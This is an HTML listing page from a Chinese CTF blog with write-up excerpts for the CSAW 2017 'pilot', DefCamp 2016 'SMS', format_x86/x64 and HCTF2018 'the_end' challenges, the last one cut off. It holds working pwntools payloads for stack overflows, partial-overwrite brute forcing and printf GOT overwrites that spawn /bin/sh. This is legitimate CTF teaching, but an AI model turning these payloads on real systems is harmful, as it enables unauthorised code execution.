@@ -1,0 +1,661 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
+<meta property="og:title" content="PIG-007">
+<meta property="og:url" content="http://pig-007.github.io/page/5/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="PIG-007">
+<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/5/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/CSAW%20Quals%20CTF%202017-pilot/">CSAW Quals CTF 2017-pilot</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规check，发现这破程序啥保护也没开，而且还存在RWX段：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg" alt="img"></p>
+<p>这不瞎搞嘛。之后IDA找漏洞，发现栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf; // [rsp+0h] [rbp-20h]</span><br><span class="line">if ( read(0, &amp;buf, 0x40uLL) &gt; 4 )：</span><br></pre></td></tr></table></div></figure>
+
+<p>2.这里就可以思考下攻击思路，存在栈溢出，还有RWX段，考虑用shellcode。虽然这个RWX段是随机生成的栈，地址没办法确定。再看看程序，发现程序自己给我们泄露了buf的栈地址：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg" alt="img"></p>
+<p>也就是说紧跟再location后面的打印出来的就是buf的真实栈地址，这样我们就可以接受该栈地址，然后用栈溢出使得我们的main函数返回时可以跳转到对应的buf地址上，而buf地址上的内容就是我们的输入，也就是输入的shellcode，这样就可以执行我们的shellcode了。</p>
+<p>3.但是写完shellcode会发现程序崩溃，这里进入IDA调试一下shellcode。可以发现程序运行过程中，Main函数return执行之后，跳转到shellcode的地方，然后运行shellcode。但是这一过程中，栈顶指向了main函数return的地址。所以在运行shellcode过程中，由于shellcode中有一个push rbx命令，导致rsp向上移动8个字节会覆盖掉shellcode的首地址。本来这没啥事，毕竟已经进入到shellcode当中去了，但是后面还有push rax和push rdi这两个改变rsp的命令，这就导致了rsp再次向低地址覆盖了16个字节，总共覆盖了24个字节。但是我们输入的shellcode有48个字节，顺序为shellcode+nop*10+addr_shellcode，也就是扣掉最后18个字节，还多出来6个字节覆盖掉了我们的执行代码shellcode的最后6个字节代码，导致我们的shellcode没办法完全执行，最终导致程序出错。</p>
+<p>4.由于read函数允许我们输入0x40，也就是64个字节，也就是在覆盖掉返回地址之后，我们还能再输入64-48=16个字节。由于push rdi之后的片段为8个字节(包括了push rdi)，小于16个字节，能够容纳下我们被覆盖掉的shellcode的代码，所以这里我们可以考虑用拼接的方式来把shellcode完美执行。</p>
+<p>5.现在考虑如何把两段shellcode汇编代码连在一起。有call,return和jmp，但是前面两条指令中，call会push进函数地址，而return也会修改栈和寄存器的状态，ret指令的本质是pop eip，即把当前栈顶的内容作为内存地址进行跳转。所以只能选择jmp跳转。</p>
+<p>6.可以查阅Intel开发者手册或其他资料找到jmp对应的字节码，或者这个程序中带了一条Jmp可以加以利用。为EB，jmp x总共2个字节：EB x.</p>
+<p>7.将两段隔开，从push rdi开始，将push rdi和之后的代码都挪到下一个地方。这时第一段shellcode应该是22+2(jmp x)=24个字节，距离下段shellcode的距离应该是48-24=24，也就对应0x18h，所以总的shellcode应该是shellcode1+EB 18h+shellcode2，这样可以顺利执行需要的shellcode。</p>
+<p>▲jmp的跳转计算距离是从jmp指令下一条开始计算的。</p>
+<p>▲shellcode的两段执行：</p>
+<p>1.需要泄露地址，读取泄露地址：</p>
+<p>A.print io.recvuntil(“Location:”)#读取到即将泄露地址的地方。</p>
+<p>B.shellcode_address_at_stack = int(io.recv()[0:14], 16)#将泄露出来的地址转换为数字流</p>
+<p>C.log.info(“Leak stack address = %x”, shellcode_address_at_stack)#将泄露地址尝试输出，观察是否泄露成功。</p>
+<p>2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/DefCamp%20CTF%20Finals%202016-SMS/">DefCamp CTF Finals 2016-SMS</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec操作，开了PIE和NX，首先shellcode不能用。其次PIE表示地址随机化，也就是没办法覆盖返回地址来直接跳转到我们想要的函数处。IDA打开找漏洞，可以看到在doms函数中的v1的栈地址被传递给set_user和set_sms</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg" alt="img"></p>
+<p>之后set_user中会读取输入保存在S这个栈地址上，然后从s中读取前四十个字节到a1[140]-a1[180]，这个a1就是doms函数中的v1。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg" alt="img"></p>
+<p>再往后看，在set_sms函数中，同样读取1024个字节到S这个栈变量中，并且最后将S的特定长度strncpy给a1，这个特定长度就是a1[180]。所以这里我们可以通过set_user来控制a1[180]，进而控制set_sms函数中strncpy给a1拷贝的长度，也就是doms函数中v1的长度，使其大于v1距离栈底的距离0xc0，从而在doms函数栈中执行栈溢出，而doms函数中的v1也就是a1，是在set_sms中由我们输入到S上的内容拷贝过去的，长度为0x400，完全可控。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg" alt="img"></p>
+<p>另外程序存在后门frontdoor()，只要进入这个函数，再输入binsh字符串就能getshell。</p>
+<p>2.所以现存在doms函数栈溢出，后门函数这两个漏洞，但是由于PIE，在程序运行过程中没办法确定frontdoor()的地址，无法直接覆盖doms函数返回地址到达后门函数</p>
+<p>3.这里就需要用到内存页的一个知识点，由于一个内存页的大小为0x1000，而frontdoor()函数和dosms函数和main函数等等函数，都在同一个内存页上，所以在64位程序下他们的函数地址都是0x############x<em><strong>这种类型，前面12位#每次加载都不一样，而后面的三位</strong></em>不会发生改变，因为都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。用IDA打开按ctrl+s可以看到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png" alt="img"></p>
+<p>这些段都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。而开启了PIE程序的，0000563cc913(x)这个数值每次都会变化，但是最后三位是不会改变的，就是固定相对于这个内存页起始位置的偏移。</p>
+<p>4.所以覆盖返回地址时，可以想到，dosms函数的返回地址是call dosms下一条指令，也就是在main函数上，而frontdoor函数的地址与main函数的地址都在0x0000563cc913(x)这个内存页上。所以当程序被加载，0x0000563cc913(x)这个数值发生改变时，frontdoor函数和main函数地址中对应的数值也会相应改变，而且都是一样的。这种情况下，就可以通过修改dosms返回地址的后四位，也就是之前的(x)yyy来跳转到frontdoor。</p>
+<p>5.如果直接爆破，按照数学期望需要尝试0xffff+1=65535+1这么多次，太巨大。这里又考虑到yyy时不会改变的，所以用IDA可以看到frontdoor函数的后三位地址为900，我们在写payload的时候直接写入即可，就是PIE也不会发生改变。现在唯一不确定的就是(x)yyy中的x。直接爆破就好，平均尝试的数学期望为f+1=16次，也不算太高。</p>
+<p>6.所以尝试写payload:</p>
+<p>(1)修改set_user中的a1[180]的值：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def setlength():</span><br><span class="line">    io.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    payload_setlength = &#x27;a&#x27;*40 #padding</span><br><span class="line">    payload_setlength += &#x27;\xca&#x27; </span><br><span class="line">    io.sendline(payload_setlength)</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)执行栈溢出，覆盖返回地址的低两个字节为”\x(x)9”和”\x01”(大端序，注意顺序)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def StackOverflow():</span><br><span class="line">    io.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    payload_StackOverflow = &#x27;a&#x27;*200 #padding</span><br><span class="line">    payload_StackOverflow += &#x27;\x01\xa9&#x27; </span><br><span class="line">    #frontdoor的地址后三位是0x900, +1跳过push rbp，影响</span><br><span class="line">    io.sendline(payload_StackOverflow)</span><br></pre></td></tr></table></div></figure>
+
+<p>这里跳过push rbp的原因是因为strncpy的关系，如果发送的是\x00,\xa9，那么先复制\x00，则会由于strncpy的机制提前结束复制，造成a9没办法复制进去，从而程序出错。(发送的由于是fget函数，所以会全盘接受，\x00也会接受，不是读取函数的原因。)而跳过push rbp并不影响frontdoor里面的函数执行，所以不会影响getshell。</p>
+<p>(3)由于每次地址随机，所以地址随机成a900的概率为1/16，那么就考虑用自动化来爆破实施：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i += 1</span><br><span class="line">    print i</span><br><span class="line">    io.remote(&quot;127.0.0.1&quot;,0000)</span><br><span class="line">    setlength()</span><br><span class="line">    StackOverflow()</span><br><span class="line">    try:</span><br><span class="line">        io.recv(timeout = 1) </span><br><span class="line">        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError</span><br><span class="line">    except EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        sleep(0.1)</span><br><span class="line">        io.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">        sleep(0.1)</span><br><span class="line">        io.interactive() #没有EOFError的话就是爆破成功，可以开shell</span><br><span class="line">        break</span><br></pre></td></tr></table></div></figure>
+
+<p>▲如果直接process本地则没办法成功运行，需要用socat转发，用127.0.0.1本地连接才可以。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Format_x86%E5%92%8Cformat_x64/">Format_x86和format_x64</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>★32位程序：</p>
+<p>1.常规checksec，只开了NX。打开IDA查漏洞，main函数中格式化字符串漏洞：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">memset(&amp;buf, 0, 0x12Cu);</span><br><span class="line">read(0, &amp;buf, 0x12Bu);</span><br><span class="line">printf(&amp;buf);</span><br></pre></td></tr></table></div></figure>
+
+<p>2.这里会有一个重复读取的循环，开shell需要system函数和binsh字符串，这里只有system函数，got和plt都对应有，没有binsh字符串，没有libc。</p>
+<p>3.由于printf漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将printf的got中的值更改system函数plt表项的值。原本如果调用printf函数，则相当于执行printf函数的got表中保存的printf函数的真实地址处的代码，更改之后相当于执行system函数plt表地址处的代码，也就相当于调用system函数。原理如下：</p>
+<p>原本执行Printf函数：相当于执行printf的执行代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got_addr:   7Fxxxxxx</span><br><span class="line">7Fxxxxxx:          printf的执行代码</span><br></pre></td></tr></table></div></figure>
+
+<p>更改之后：相当于执行jmp system_got代码，那就相当于执行system函数了</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got_addr:          08048320(system_plt)</span><br><span class="line">08048320(system_plt):     jmp system_got</span><br></pre></td></tr></table></div></figure>
+
+<p>4.那么预想程序总流程如下：第一次读取，输入payload，然后printf执行，将printf的got表更改为system函数plt表。通过while循环，第二次读取，输入binsh字符存入buf中，此时printf(&amp;buf)，相当于system(&amp;buf)，那就相当于system(binsh)，即可直接getshell。</p>
+<p>5.编写payload，首先需要计算一下偏移地址，将断点下在call printf上，通过调试能够查看到printf写入栈中的地址距离esp的偏移量为6，所以使用控制字符%n来将printf劫持到system，这里偏移就会成n-1为5。偏移代表的是取参数的时候的偏移量，下面的payload对应的5，6，7，8就对应向地址print_got，print_got+1，print_got+2，print_got+3写入内容。由于是修改地址，所以用%hhn来逐个修改，防止向服务器发送过大数据从而出错。</p>
+<p>(1)找到got表和plt表项的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got = 0x08049778</span><br><span class="line">system_plt = 0x08048320</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)32位程序，4个字节一个地址，所以需要四个地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got)</span><br><span class="line">payload += p32(printf_got+1)</span><br><span class="line">payload += p32(printf_got+2)</span><br><span class="line">payload += p32(printf_got+3)</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)由于是大端序，低地址保存的是高地址的内容，print_got需要保存的应该是system_plt的最后一个字节，也就是0x20。</p>
+<p>①由于前面已经输入了p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)，这些在没有遇到%之前一定会被打印出来，共计16个字节，而我们需要让它总共打印出0x20个字节，所以我们再打印(0x20-16)个字节。</p>
+<p>②同样，由于前面已经打印了0x20个字节，我们总共需要打印0x83个字节，所以应该再让程序打印%(0x83-0x20)个字节，之后道理相同。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x20-16)</span><br><span class="line">payload += &quot;c%5$hhn&quot;</span><br><span class="line">#写入0x20到地址print_got</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x83-0x20)</span><br><span class="line">payload += &quot;c%6$hhn&quot;</span><br><span class="line">#写入0x83到地址print_got+1</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x104-0x83)</span><br><span class="line">payload += &quot;c%7$hhn&quot;</span><br><span class="line">#写入0x04到地址print_got+2，0x104被截断为04</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x108-0x104)</span><br><span class="line">payload += &quot;c%8$hhn&quot;</span><br><span class="line">#写入0x08到地址print_got+3，0x108被截断为08</span><br></pre></td></tr></table></div></figure>
+
+<p>▲为了便于理解，下面代码也行：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+1) </span><br><span class="line">#使用hhn写入，分别对应待写入的第3，4，2，1字节</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += p32(printf_got+2)</span><br><span class="line">payload += p32(printf_got+3)</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉</span><br><span class="line">payload += &quot;c%5$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x120-0x83)</span><br><span class="line">payload += &quot;c%6$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位</span><br><span class="line">payload += &quot;c%7$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x208-0x204)</span><br><span class="line">payload += &quot;c%8$hhn&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>6.其实可以直接使用类Fmtstr，效果一样，将Payload替换成下列代码即可</p>
+<p>payload = fmtstr_payload(5, {printf_got:system_plt})</p>
+<p>7.之后再io.sendline(‘/bin/sh\x00’)，即可getshell</p>
+<p>★64位程序</p>
+<p>1.由于64位，传参的顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以偏移量应该是6指向栈顶。之后考虑使用fmtstr来直接构造获取：</p>
+<p>payload = fmtstr_payload(6, {printf_got:system_plt})</p>
+<p>但是这个方法会出错，因为在这种情况下，我们的地址如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got = 0x00601020</span><br><span class="line">system_plt = 0x00400460</span><br></pre></td></tr></table></div></figure>
+
+<p>需要写入地址printf_got的首两位是00，且以p64形式发送，所以先发送的是0x20，0x10，0x60，0x00，0x00…….而Read函数读到0x00就会截断，默认这是字符串结束了，所以之后的都无效了。</p>
+<p>2.那么考虑手动方式，将p64(printf_got)放在payload的末尾，这样就只有最后才会读到0x00，其它的有效数据都能读入。</p>
+<p>3.使用手动方式就需要再次计算偏移量，我们的payload构成应该是</p>
+<p>payload = ”%”+str(system_plt)+”c%8$lln” + p64(printf_got)</p>
+<p>这里偏移量为8是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了</p>
+<p>1(%) + 7(0x400460转换成十进制为4195424，也就是7个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23个字节。</p>
+<p>经过计算我们发现，p64前面的字节数为15个字节，不足8的倍数，这样会导致printf_got的最后一个字节20被截断至偏移量为7的位置，从而使得偏移量为8的位置只有6010，导致出错。所以我们需要填充一个字节进去，让它不会被截断。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png" alt="img"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)</span><br></pre></td></tr></table></div></figure>
+
+<p>加入一个字节a就可以使得在参数偏移量为6和7的位置中不会截断0x601020。同时加入字节a就要使system_plt-1来满足最终打印的字符个数为0x00400460，从而才能成功将0x00400460(system_plt)写入到0x00601020(printf_got)</p>
+<p>5.完成payload之后，再次循环进入，输入io.sendline(‘/bin/sh\x00’)后interactive()即可getshell</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/HCTF2018_the_end/">HCTF2018_the_end</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，除了canary之外保护全开。IDA打开找漏洞，没什么漏洞，就是程序会泄露出sleep的地址，然后让我们在任意地方写入5个字节，并且给了libc文件，那么就可以算出libc基地址，版本为2.23。</p>
+<p>printf(“here is a gift %p, good luck ;)\n”, &amp;sleep);</p>
+<p>2.程序最后调用exit(1337)，两种方法：</p>
+<p>(1)exit会无条件通过_IO_2_1_stdout_结构体调用vtable虚表中的_setbuf函数。</p>
+<p>(2)exit会通过_IO_2_1_stdout_结构体调用vtable虚表中的_overflow函数，但需要满足以下条件：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus._mode &lt;= 0</span><br><span class="line">_IO_FILE_plus._IO_write_ptr &gt; _IO_FILE_plus._IO_write_base</span><br></pre></td></tr></table></div></figure>
+
+<p>所以我们伪造的_IO_FILE_plus结构体就需要满足上述条件</p>
+<p>(3)exit会调用_rtld_global结构体中的_dl_rtld_lock_recursive函数，不用满足条件。</p>
+<p>3.三种方法攻击思路:</p>
+<p>(1)由于会调用_setbuf函数，vtable位于libc数据段上不可写部分，无法直接修改vtable对应的_IO_file_jumps中的函数指针。那么可以伪造_IO_2_1_stdout_中的vtable指针，利用2字节修改vtable指针的倒数两个字节，使其指向一个可读可写内存，形成一个fake_IO_file_jumps，然后在该内存对应_setbuf函数偏移处伪造one_gadget地址。</p>
